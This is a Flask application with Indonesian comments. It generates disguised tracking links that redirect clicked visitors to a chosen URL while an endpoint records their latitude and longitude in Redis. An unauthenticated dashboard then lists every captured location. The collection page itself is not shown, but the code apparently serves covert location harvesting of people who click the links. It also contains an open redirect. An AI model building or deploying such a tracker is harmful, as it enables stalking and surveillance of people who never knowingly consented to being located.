from flask import Flask, render_template, request, redirect, url_for
import redis
import uuid
import os
import json
from datetime import datetime

app = Flask(__name__)

# Konfigurasi Redis menggunakan environment variables dari Vercel
class RedisClient:
    def __init__(self):
        self.redis_url = os.getenv('KV_URL')
        self.redis_token = os.getenv('KV_REST_API_TOKEN')
        
        if self.redis_url and self.redis_token:
            # Gunakan Redis REST API untuk Upstash
            import requests
            self.use_rest_api = True
            self.base_url = self.redis_url.replace('redis://', 'https://').replace(':6379', '')
            self.headers = {
                'Authorization': f'Bearer {self.redis_token}',
                'Content-Type': 'application/json'
            }
        else:
            # Fallback ke Redis lokal untuk development
            self.redis_client = redis.Redis(host='localhost', port=6379, decode_responses=True)
            self.use_rest_api = False
    
    def set(self, key, value):
        if self.use_rest_api:
            import requests
            response = requests.post(
                f'{self.base_url}/set/{key}',
                headers=self.headers,
                data=json.dumps(value) if isinstance(value, (dict, list)) else value
            )
            return response.status_code == 200
        else:
            return self.redis_client.set(key, json.dumps(value) if isinstance(value, (dict, list)) else value)
    
    def get(self, key):
        if self.use_rest_api:
            import requests
            response = requests.get(f'{self.base_url}/get/{key}', headers=self.headers)
            if response.status_code == 200:
                result = response.json().get('result')
                try:
                    return json.loads(result) if result else None
                except:
                    return result
            return None
        else:
            result = self.redis_client.get(key)
            if result:
                try:
                    return json.loads(result)
                except:
                    return result
            return None
    
    def delete(self, key):
        if self.use_rest_api:
            import requests
            response = requests.post(f'{self.base_url}/del/{key}', headers=self.headers)
            return response.status_code == 200
        else:
            return self.redis_client.delete(key)
    
    def keys(self, pattern='*'):
        if self.use_rest_api:
            import requests
            response = requests.post(
                f'{self.base_url}/keys/{pattern}',
                headers=self.headers
            )
            if response.status_code == 200:
                return response.json().get('result', [])
            return []
        else:
            return self.redis_client.keys(pattern)
    
    def sadd(self, key, value):
        if self.use_rest_api:
            import requests
            response = requests.post(
                f'{self.base_url}/sadd/{key}',
                headers=self.headers,
                data=json.dumps([value])
            )
            return response.status_code == 200
        else:
            return self.redis_client.sadd(key, value)
    
    def smembers(self, key):
        if self.use_rest_api:
            import requests
            response = requests.get(f'{self.base_url}/smembers/{key}', headers=self.headers)
            if response.status_code == 200:
                return response.json().get('result', [])
            return []
        else:
            return list(self.redis_client.smembers(key))

# Inisialisasi Redis client
db = RedisClient()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/create', methods=['POST'])
def create_tracker():
    data = request.get_json()
    redirect_url = data.get('redirect_url', '/')
    tracker_id = str(uuid.uuid4())
    
    # Simpan tracker data ke Redis
    tracker_data = {
        'redirect_url': redirect_url,
        'created_at': datetime.now().isoformat()
    }
    db.set(f'tracker:{tracker_id}', tracker_data)
    
    return {"link": f"{request.host_url}r/{tracker_id}"}

@app.route('/r/<tracker_id>')
def redirect_link(tracker_id):
    # Ambil tracker data dari Redis
    tracker_data = db.get(f'tracker:{tracker_id}')
    
    if not tracker_data:
        return "Invalid Tracker ID", 404
    
    redirect_url = tracker_data['redirect_url']
    return render_template('redirect.html', tracker_id=tracker_id, redirect_url=redirect_url)

@app.route('/api/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    tracker_id = data['tracker_id']
    lat = data['latitude']
    lon = data['longitude']

    # Simpan location data ke Redis
    location_data = {
        'latitude': lat,
        'longitude': lon,
        'timestamp': datetime.now().isoformat()
    }
    
    # Gunakan unique key untuk setiap location entry
    location_key = f'location:{tracker_id}:{uuid.uuid4()}'
    db.set(location_key, location_data)
    
    # Tambahkan ke set untuk tracking semua locations dari tracker ini
    db.sadd(f'tracker_locations:{tracker_id}', location_key)
    
    return {"status": "success"}

@app.route('/dashboard')
def dashboard():
    locations = {}
    
    # Ambil semua tracker keys
    tracker_keys = db.keys('tracker:*')
    
    for tracker_key in tracker_keys:
        # Extract tracker_id dari key
        tracker_id = tracker_key.split(':')[1]
        
        # Ambil semua location keys untuk tracker ini
        location_keys = db.smembers(f'tracker_locations:{tracker_id}')
        
        locations[tracker_id] = []
        
        for location_key in location_keys:
            location_data = db.get(location_key)
            if location_data:
                locations[tracker_id].append({
                    "lat": location_data['latitude'],
                    "lon": location_data['longitude'],
                    "timestamp": location_data['timestamp']
                })
    
    return render_template('dashboard.html', locations=locations)